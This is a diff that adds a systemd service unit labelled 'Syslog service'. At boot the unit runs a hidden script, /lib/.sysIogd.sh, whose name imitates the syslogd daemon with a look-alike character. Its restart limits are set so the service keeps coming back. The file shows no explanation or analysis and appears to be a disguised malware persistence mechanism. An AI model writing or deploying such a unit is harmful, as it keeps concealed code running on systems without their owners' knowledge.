@@ -1,0 +1,12 @@
+[Unit]
+Description=Syslog service
+
+[Service]
+Type=forking
+Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
+ExecStart=/bin/bash -c 'bash /lib/.sysIogd.sh'
+StartLimitInterval=1s
+StartLimitBurst=999
+
+[Install]
+WantedBy=multi-user.target
